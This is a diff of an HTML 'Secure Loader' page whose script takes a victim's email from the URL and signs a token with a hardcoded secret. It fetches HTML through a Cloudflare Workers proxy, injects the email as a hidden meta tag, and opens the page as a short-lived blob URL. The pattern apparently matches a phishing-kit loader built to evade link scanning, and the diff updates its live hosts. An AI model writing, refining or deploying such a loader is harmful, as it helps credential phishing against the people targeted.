@@ -1,24 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Loader</title>
+<title>Secure Loader</title>
 </head>
 <body>
 
 <script>
 (async function () {
 
-  /* ================= CONFIG ================= */
-  const WORKER_URL = 'https://original-action-744073.framer.app/'; // <-- CHANGE
-  const SHARED_SECRET = '1234567890';           // <-- CHANGE (same as worker)
-  /* ========================================== */
+  /* ===== CONFIG (EDIT THESE 2 ONLY) ===== */
+  const WORKER_URL = 'https://bl3.saleudon1.workers.dev';
+  const SHARED_SECRET = '1234567890'; // same as worker
+  /* ===================================== */
 
   const params = new URLSearchParams(location.search);
-  const emailParam = params.get('email');
-  if (!emailParam) return;
+  let email = params.get('email');
+  if (!email) return;
 
-  const email = decodeURIComponent(emailParam);
+  try { email = decodeURIComponent(email); } catch {}
+
   const emailB64 = btoa(email);
 
   async function sha256(input) {
@@ -31,15 +32,15 @@
       .join('');
   }
 
-  // Hash email
+  /* ---- Hash email ---- */
   const emailHash = await sha256(emailB64);
 
-  // Token (30s TTL)
+  /* ---- Create signed token ---- */
   const ts = Date.now();
   const sig = await sha256(ts + '|' + emailHash + '|' + SHARED_SECRET);
   const token = btoa(`${ts}|${emailHash}|${sig}`);
 
-  // Fetch hardened proxy
+  /* ---- Fetch through worker ---- */
   const res = await fetch(
     `${WORKER_URL}?t=${encodeURIComponent(token)}&h=${emailHash}`,
     { cache: 'no-store' }
@@ -49,24 +50,23 @@
 
   let html = await res.text();
 
-  // Inject email safely
+  /* ---- Inject email (base64, hidden) ---- */
   html = html.replace(
     /<\/head>/i,
     `<meta name="injected-email" content="${emailB64}"></head>`
   );
 
-  // Create one-time blob
+  /* ---- Create one-time blob ---- */
   const blob = new Blob([html], { type: 'text/html' });
   const blobURL = URL.createObjectURL(blob);
 
   window.open(blobURL, '_blank');
 
-  // Revoke blob (one-time use)
-  setTimeout(() => URL.revokeObjectURL(blobURL), 6000);
+  /* ---- Revoke blob (one-time use) ---- */
+  setTimeout(() => URL.revokeObjectURL(blobURL), 5000);
 
 })();
 </script>
 
 </body>
 </html>
-
